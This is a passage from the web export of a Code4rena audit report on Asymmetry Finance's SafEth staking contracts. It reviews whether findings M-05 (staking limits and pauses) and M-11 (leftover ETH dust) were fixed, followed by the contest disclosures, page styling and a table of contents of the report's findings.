2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/47\">Mitigation of M-05: Issue not mitigated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/47\">adriro</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/64\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/17\">0x52</a></em></p>\n<p>Link to Issue: <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/812</a></p>\n<h3 id=\"comments-3\" style=\"position:relative;\"><a href=\"#comments-3\" aria-label=\"comments 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Comments</h3>\n<p>The issue describes missing checks associated with staking requirements for the WstEth and Reth derivative. The proposed mitigation is to introduce a disable mechanism so that derivatives can be eventually disabled and skipped. This change is too restrictive, fails to correctly address all different described scenarios and can potentially introduce other issues.</p>\n<h3 id=\"technical-details-4\" style=\"position:relative;\"><a href=\"#technical-details-4\" aria-label=\"technical details 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Details</h3>\n<p>There are some requirements that don’t justify disabling the derivative in a global or permanent manner. For example, the issue mentions a daily staking limit for stETH which can be correctly mitigated by just shutting down the derivative.</p>\n<p>Here is an itemized summary of the issues in this mitigation:</p>\n<ul>\n<li>Reth derivative is mitigated in another changeset as the stake operation now goes through RocketSwapRouter.</li>\n<li>The WstETH staking still suffers from the issues described in the original report, as disabling the whole derivative is not a proper solution to address a daily staking limit.</li>\n<li>The staking pause in Lido is also problematic, as disabling the derivative will not only disable deposits but also withdrawals, causing locked funds (this new issue is expanded in detail in <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/61\">issue 61</a>).</li>\n<li>frxETH also has staking requirement. These are described in issue #763 (<a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/763\">https://github.com/code-423n4/2023-03-asymmetry-findings/issues/763</a>), which is a duplicate of the principal issue. Staking in FRAX can be eventually paused, which causes the same issue described in the previous item.</li>\n<li>Associated new issues of disabling derivatives are described in <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/61\">issue 61</a>.</li>\n</ul>\n<h3 id=\"recommendation-14\" style=\"position:relative;\"><a href=\"#recommendation-14\" aria-label=\"recommendation 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>In the case of stETH, if the limit is reached, a potential solution would be to swap the assets using a pool. For the pause issues in stETH and frxETH, see report [adriro-NEW-M-01].</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/47#issuecomment-1539151498\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>Looking at this again. Thanks.</p>\n</blockquote>\n<hr>\n<h2 id=\"mitigation-of-m-11-issue-not-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-m-11-issue-not-mitigated\" aria-label=\"mitigation of m 11 issue not mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/65\">Mitigation of M-11: Issue not mitigated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/65\">d3e4</a>, also reviewed by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/55\">adriro</a></em></p>\n<h3 id=\"mitigated-issue-2\" style=\"position:relative;\"><a href=\"#mitigated-issue-2\" aria-label=\"mitigated issue 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigated issue</h3>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/152\">M-11: Residual ETH unreachable and unuitilized in SafEth.sol</a></p>\n<p>The issue was that the rounding losses from partitioning <code>msg.value</code> in <code>stake()</code> and <code>rebalanceToWeights()</code> was left irretrievably in the contract.</p>\n<h3 id=\"mitigation-review-3\" style=\"position:relative;\"><a href=\"#mitigation-review-3\" aria-label=\"mitigation review 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation review</h3>\n<p>Previously <code>rebalanceToWeights()</code> withdrew all staked funds and redeposited only the ether that the contract received. Now, it redeposits its entire balance. As such, the rounding losses still remain in the contract after a call to <code>rebalanceToWeights()</code>, but the next time it is called this dust will be redeposited. Thus, at least <code>rebalanceToWeights()</code> doesn’t gather dust (even though it’s “not going to be used often, if at all”).</p>\n<p>The issue in <code>stake()</code> remains unmitigated per se. The dust generated there would of course also be picked up by <code>rebalanceToWeights()</code>, but since <code>rebalanceToWeights()</code> is “not going to be used often, if at all”, and causes a significant loss for the protocol (<a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/765\">M-07</a>), this issue cannot be considered mitigated.</p>\n<h3 id=\"suggestion\" style=\"position:relative;\"><a href=\"#suggestion\" aria-label=\"suggestion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Suggestion</h3>\n<p>Sweep the dust in <code>stake()</code> instead by adding the balance to <code>msg.value</code>. Or use the entire balance in <code>unstake()</code>. These functions will be called frequently and it doesn’t hurt to reward users with some dust.</p>\n<p>Note that this would entail that this check (<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L148-L151</code>) in <code>unstake()</code> would have to be removed:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"177\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ethBefore</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Receive zero Ether&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>See also the new issue titled <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/69\">Reappearance of M-02 in SafEth.unstake()</a> for another reason this check should be removed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/65#issuecomment-1539091849\">elmutt (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>Dust of this amount is acceptable to us.</p>\n</blockquote>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-8\">High Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#h-01-an-attacker-can-manipulate-the-predepositveprice-to-steal-from-other-users\">[H-01] An attacker can manipulate the preDepositvePrice to steal from other users</a></li>\n<li><a href=\"#h-02-a-temporary-issue-shows-in-the-staking-functionality-which-leads-to-the-users-receiving-less-minted-tokens\">[H-02] A temporary issue shows in the staking functionality which leads to the users receiving less minted tokens</a></li>\n<li><a href=\"#h-03-users-can-fail-to-unstake-and-lose-their-deserved-eth-because-malfunctioning-or-untrusted-derivative-cannot-be-removed\">[H-03] Users can fail to unstake and lose their deserved ETH because malfunctioning or untrusted derivative cannot be removed</a></li>\n<li><a href=\"#h-04-price-of-sfrxeth-derivative-is-calculated-incorrectly\">[H-04] Price of sfrxEth derivative is calculated incorrectly</a></li>\n<li><a href=\"#h-05-reth-poolprice-calculation-may-overflow\">[H-05] Reth <code>poolPrice</code> calculation may overflow</a></li>\n<li><a href=\"#h-06-wsteth-derivative-assumes-a-11-peg-of-steth-to-eth\">[H-06] <code>WstEth</code> derivative assumes a <code>~1=1</code> peg of stETH to ETH</a></li>\n<li><a href=\"#h-07-rethsol-withdrawals-are-unreliable-and-depend-on-excess-rocketdepositpool-balance-which-can-brick-the-whole-protocol\">[H-07] <code>Reth.sol</code>: Withdrawals are unreliable and depend on excess <code>RocketDepositPool</code> balance which can brick the whole protocol</a></li>\n<li><a href=\"#h-08-staking-unstaking-and-rebalancetoweight-can-be-sandwiched-mainly-reth-deposit\">[H-08] Staking, unstaking and rebalanceToWeight can be sandwiched (Mainly rETH deposit)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-12\">Medium Risk Findings (12)</a></p>\n<ul>\n<li><a href=\"#m-01-division-before-multiplication-truncate-minout-and-incurs-heavy-precision-loss-and-result-in-insufficient-slippage-protection\">[M-01] Division before multiplication truncate <code>minOut</code> and incurs heavy precision loss and result in insufficient slippage protection</a></li>\n<li><a href=\"#m-02-sfrxeth-may-revert-on-redeeming-non-zero-amount\">[M-02] sFrxEth may revert on redeeming non-zero amount</a></li>\n<li><a href=\"#m-03-potential-stake-dos-if-sole-safeth-holder-ie-first-depositor-unstakes-totalsupply---1\">[M-03] Potential <code>stake()</code> DoS if sole safETH holder (ie: first depositor) unstakes <code>totalSupply</code> - 1</a></li>\n<li><a href=\"#m-04-lack-of-deadline-for-uniswap-amm\">[M-04] Lack of deadline for uniswap AMM</a></li>\n<li><a href=\"#m-05-missing-derivative-limit-and-deposit-availability-checks-will-revert-the-whole-stake-function\">[M-05] Missing derivative limit and deposit availability checks will revert the whole <code>stake()</code> function</a></li>\n<li><a href=\"#m-06-dos--due-to-external-call-failure\">[M-06] DoS  due to external call failure</a></li>\n<li><a href=\"#m-07-in-de-peg-scenario-forcing-full-exit-from-every-derivative--immediately-re-entering-can-cause-big-losses-for-depositors\">[M-07] In de-peg scenario, forcing full exit from every derivative &#x26; immediately re-entering can cause big losses for depositors</a></li>\n<li><a href=\"#m-08-possible-dos-on-unstake\">[M-08] Possible DoS on <code>unstake()</code></a></li>\n<li><a href=\"#m-09-non-ideal-rethweth-pool-used-pays-unnecessary-fees\">[M-09] Non-ideal rETH/WETH pool used pays unnecessary fees</a></li>\n<li><a href=\"#m-10-stuck-ether-when-use-function-stake-with-empty-derivativesderivativecount--0\">[M-10] Stuck ether when use function <code>stake</code> with empty <code>derivatives</code>(<code>derivativeCount</code> = 0)</a></li>\n<li><a href=\"#m-11-residual-eth-unreachable-and-unutilized-in-safethsol\">[M-11] Residual ETH unreachable and unutilized in SafEth.sol</a></li>\n<li><a href=\"#m-12-no-slippage-protection-on-stake-in-safethsol\">[M-12] No slippage protection on <code>stake()</code> in SafEth.sol</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#01-add-checks-for-weight-values\">01 Add checks for weight values</a></li>\n<li><a href=\"#02-lack-of-method-to-remove-derivatives\">02 Lack of method to remove derivatives</a></li>\n<li><a href=\"#03-reentrancy-for-safethunstake\">03 Reentrancy for <code>SafEth.unstake()</code></a></li>\n<li><a href=\"#04-unbounded-loop\">04 Unbounded loop</a></li>\n<li><a href=\"#05-emit-events-before-external-calls\">05 Emit events before external calls</a></li>\n<li><a href=\"#06-pragma-float\">06 Pragma float</a></li>\n<li><a href=\"#07-lack-of-address0-checks\">07 Lack of address(0) checks</a></li>\n<li><a href=\"#08-lack-of-setter-functions-for-third-party-integrations\">08 Lack of setter functions for third party integrations</a></li>\n<li><a href=\"#09-dont-allow-adding-a-new-derivative-when-stakingunstaking-is-paused\">09 Don’t allow adding a new derivative when staking/unstaking is paused</a></li>\n<li><a href=\"#10-critical-changes-should-use-a-two-step-pattern-and-a-timelock\">10 Critical changes should use a two-step pattern and a timelock</a></li>\n<li><a href=\"#11-lack-of-event-for-parameters-changes\">11 Lack of event for parameters changes</a></li>\n<li><a href=\"#12-lack-of-old-and-new-value-for-events-related-to-parameter-updates\">12 Lack of old and new value for events related to parameter updates</a></li>\n<li><a href=\"#13-check-for-stale-values-on-setter-functions\">13 Check for stale values on setter functions</a></li>\n<li><a href=\"#14-calls-for-retrieving-the-balance-can-be-cached\">14 Calls for retrieving the balance can be cached</a></li>\n<li><a href=\"#15-variable-being-initialized-with-the-default-value\">15 Variable being initialized with the default value</a></li>\n<li><a href=\"#16-unnecessary-calculation\">16 Unnecessary calculation</a></li>\n<li><a href=\"#17-missing-unit-tests\">17 Missing unit tests</a></li>\n<li><a href=\"#18-incorrect-natspec\">18 Incorrect NATSPEC</a></li>\n<li><a href=\"#19-in-safethadjustweight-theres-no-need-to-loop-all-derivatives\">19 In <code>SafEth.adjustWeight()</code> there’s no need to loop all derivatives</a></li>\n<li><a href=\"#20-variable-shadowing\">20 Variable shadowing</a></li>\n<li><a href=\"#21-usage-of-return-named-variables-and-explicit-values\">21 Usage of return named variables and explicit values</a></li>\n<li><a href=\"#22-imports-can-be-group\">22 Imports can be group</a></li>\n<li><a href=\"#23-order-of-functions\">23 Order of functions</a></li>\n<li><a href=\"#24-add-a-limit-for-the-maximum-number-of-characters-per-line\">24 Add a limit for the maximum number of characters per line</a></li>\n<li><a href=\"#25-use-scientific-notation-rather-than-exponentiation\">25 Use scientific notation rather than exponentiation</a></li>\n<li><a href=\"#26-specify-the-warning-being-disabled-by-the-linter\">26 Specify the warning being disabled by the linter</a></li>\n<li><a href=\"#27-replace-variable--false-with-variable\">27 Replace <code>variable == false</code> with <code>!variable</code></a></li>\n<li><a href=\"#28-interchangeable-usage-of-uint-and-uint256\">28 Interchangeable usage of uint and uint256</a></li>\n<li><a href=\"#29-can-use-ternary\">29 Can use ternary</a></li>\n<li><a href=\"#30-package-balancer-labsbalancer-js-is-not-used\">30 Package @balancer-labs/balancer-js is not used</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#g-01-setting-the-constructor-to-payable\">G-01 Setting the <code>constructor</code> to <code>payable</code></a></li>\n<li><a href=\"#g-02-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function\">G-02 Duplicated <code>require()</code>/<code>revert()</code> Checks Should Be Refactored To A Modifier Or Function</a></li>\n<li><a href=\"#g-03-empty-blocks-should-be-removed-or-emit-something\">G-03 Empty Blocks Should Be Removed Or Emit Something</a></li>\n<li><a href=\"#g-04-using-delete-statement-can-save-gas\">G-04 Using <code>delete</code> statement can save gas</a></li>\n<li><a href=\"#g-05-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G-05 Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#g-06-use-hardcode-address-instead-addressthis\">G-06 Use hardcode address instead <code>address(this)</code></a></li>\n<li><a href=\"#g-07-optimize-names-to-save-gas\">G-07 Optimize names to save gas</a></li>\n<li><a href=\"#g-08-x--y-costs-more-gas-than-x--x--y-for-state-variables\">G-08 <code>&#x3C;x> += &#x3C;y></code> Costs More Gas Than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> For State Variables</a></li>\n<li><a href=\"#g-09-public-functions-to-external\">G-09 Public Functions To External</a></li>\n<li><a href=\"#g-10-non-usage-of-specific-imports\">G-10 Non-usage of specific imports</a></li>\n<li><a href=\"#g-11-using-unchecked-blocks-to-save-gas\">G-11 Using <code>unchecked</code> blocks to save gas</a></li>\n<li><a href=\"#g-12-use-functions-instead-of-modifiers\">G-12 Use functions instead of modifiers</a></li>\n<li><a href=\"#g-13-use-solidity-version-0819-to-gain-some-gas-boost\">G-13 Use solidity version 0.8.19 to gain some gas boost</a></li>\n<li><a href=\"#g-14-save-loop-calls\">G-14 Save loop calls</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#mitigation-review\">Mitigation Review</a></p>\n<ul>\n<li><a href=\"#introduction\">Introduction</a></li>\n<li><a href=\"#overview-of-changes\">Overview of Changes</a></li>\n<li><a href=\"#mitigation-review-scope\">Mitigation Review Scope</a></li>\n<li><a href=\"#mitigation-review-summary\">Mitigation Review Summary</a></li>\n<li><a href=\"#high-protocol-assumes-a-11-peg-of-frxeth-to-eth\">[High] Protocol assumes a 1:1 peg of frxETH to ETH</a></li>\n<li><a href=\"#medium-chainlink-price-feed-responses-are-not-validated\">[Medium] Chainlink price feed responses are not validated</a></li>\n<li><a href=\"#medium-reappearance-of-m-02-in-wstethwithdraw\">[Medium] Reappearance of M-02 in <code>WstEth.withdraw()</code></a></li>\n<li><a href=\"#medium-rounding-loss-in-and-with-approxprice\">[Medium] Rounding loss in and with <code>approxPrice()</code></a></li>\n<li><a href=\"#medium-mitigation-of-m-08-mitigation-error\">[Medium] Mitigation of M-08: Mitigation Error</a></li>\n<li><a href=\"#medium-mitigation-of-m-10-mitigation-error\">[Medium] Mitigation of M-10: Mitigation Error</a></li>\n<li><a href=\"#medium-hard-slippage-in-rethwithdraw\">[Medium] Hard slippage in <code>Reth.withdraw()</code></a></li>\n<li><a href=\"#mitigation-of-h-06-issue-not-mitigated\">Mitigation of H-06: Issue not mitigated</a></li>\n<li><a href=\"#mitigation-of-m-01-issue-not-mitigated\">Mitigation of M-01: Issue not mitigated</a></li>\n<li><a href=\"#mitigation-of-m-02-issue-not-mitigated\">Mitigation of M-02: Issue not mitigated</a></li>\n<li><a href=\"#mitigation-of-m-04-issue-not-mitigated-there-is-still-no-way-to-set-a-deadline\">Mitigation of M-04: Issue not mitigated, there is still no way to set a deadline</a></li>\n<li><a href=\"#mitigation-of-m-05-issue-not-mitigated\">Mitigation of M-05: Issue not mitigated</a></li>\n<li><a href=\"#mitigation-of-m-11-issue-not-mitigated\">Mitigation of M-11: Issue not mitigated</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}